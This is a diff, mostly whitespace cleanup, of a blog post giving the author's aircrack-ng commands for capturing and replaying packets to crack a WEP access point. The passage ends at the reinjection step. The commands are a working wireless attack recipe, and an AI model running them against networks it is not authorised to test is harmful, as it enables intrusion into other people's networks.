@@ -77,29 +77,29 @@
 		</header>
 	
 	    <p>Speaking of <a href="http://blog.macuyiko.com/post/2010/ubuntu-1010-fixed-channel-mon0-1-aircrack-problem-with-iwl3945.html">wireless</a>&#8230;</p>
-<p>The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the <a href="http://www.aircrack-ng.org/doku.php">Aircrack wiki</a> for a bit. I though I&#8217;d posted this before, but I can&#8217;t seem to find&nbsp;it.  </p>
+<p>The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the <a href="http://www.aircrack-ng.org/doku.php">Aircrack wiki</a> for a bit. I though I&#8217;d posted this before, but I can&#8217;t seem to find&nbsp;it.</p>
 <h3><span class="caps">TTY1</span></h3>
-<div class="highlight"><pre><span></span>sudo airmon-ng start eth1  
+<div class="highlight"><pre><span></span>sudo airmon-ng start eth1
 # Assume monitor started on mon0...
 
-sudo airodump-ng mon0  
+sudo airodump-ng mon0
 # Scout interesting APs
 
-sudo airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0  
+sudo airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0
 # Make sure to replace &quot;X&quot;. This terminal is now dumping data
 </pre></div>
 
 
 <h3><span class="caps">TTY2</span></h3>
-<div class="highlight"><pre><span></span><span class="s s-Atom">sudo</span> <span class="s s-Atom">aireplay</span><span class="o">-</span><span class="s s-Atom">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="s s-Atom">a</span> <span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span> <span class="s s-Atom">mon0</span>  
+<div class="highlight"><pre><span></span><span class="s s-Atom">sudo</span> <span class="s s-Atom">aireplay</span><span class="o">-</span><span class="s s-Atom">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="s s-Atom">a</span> <span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span><span class="s s-Atom">:</span><span class="nv">XX</span> <span class="s s-Atom">mon0</span>
 <span class="c1"># ... Association successful :-)</span>
 </pre></div>
 
 
-<p>Now start the attack. I like opening a new terminal for this.<br>
+<p>Now start the attack. I like opening a new terminal for this.
 Don&#8217;t bother with the <span class="caps">ARP</span> request replay attack. The best method to use is the <code>-p 0841</code> one, especially when using a crappy wifi chip like me (<span class="caps">3945ABG</span>). Last time I checked, the advanced attack methods (KoreK chopchop, fragmentation, caffe-latte and Hirte) didn&#8217;t&nbsp;work.</p>
 <h3><span class="caps">TTY3</span></h3>
-<div class="highlight"><pre><span></span>sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b XX:XX:XX:XX:XX:XX mon0  
+<div class="highlight"><pre><span></span>sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b XX:XX:XX:XX:XX:XX mon0
 # Wait until a packet is captured. It&#39;s best to use a small one (Size: 68).
 
 # Reinject and the data-counter in TTY1 (airodump) should go up.
